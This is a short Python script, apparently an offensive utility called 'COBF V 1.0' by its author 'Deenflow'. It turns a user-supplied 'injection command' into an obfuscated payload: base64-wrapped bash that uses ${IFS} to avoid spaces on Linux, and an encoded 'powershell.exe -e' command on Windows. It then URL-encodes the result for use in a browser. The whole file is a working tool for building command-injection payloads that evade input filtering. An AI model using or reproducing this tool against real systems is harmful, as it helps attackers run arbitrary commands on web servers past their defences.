#!/usr/bin/env python3
import base64
import urllib.parse

def linux_obfuscator(command):
    b64_cmd = base64.b64encode(command.encode()).decode()
    payload = f"bash<<<$(base64${{IFS}}-d<<<{b64_cmd})"
    return payload

def Windows_obfuscator(command):
    win_bytes = command.encode('utf-16le')
    win_b64 = base64.b64encode(win_bytes).decode()
    return f"powershell.exe -e {win_b64}"

print("""
░█████╗░░█████╗░██████╗░███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░╚═╝██║░░██║██████╦╝█████╗░░
██║░░██╗██║░░██║██╔══██╗██╔══╝░░
╚█████╔╝╚█████╔╝██████╦╝██║░░░░░
░╚════╝░░╚════╝░╚═════╝░╚═╝░░░░░ V 1.0   
by: Deenflow
Discord: @deenflow
""")

os = int(input("""
1.linux 2.Windows
chose os by number:  """))

command = input("Enter the injection command: ")

if os == 1:
    result = linux_obfuscator(command)
elif os == 2:
    result = Windows_obfuscator(command)
else:
    print("Invalid choice!")
    exit()

url_result = urllib.parse.quote(result)
print(f"\n[+] Command: {result}")
print(f"[+] URL Encoded (For Browser): {url_result}")
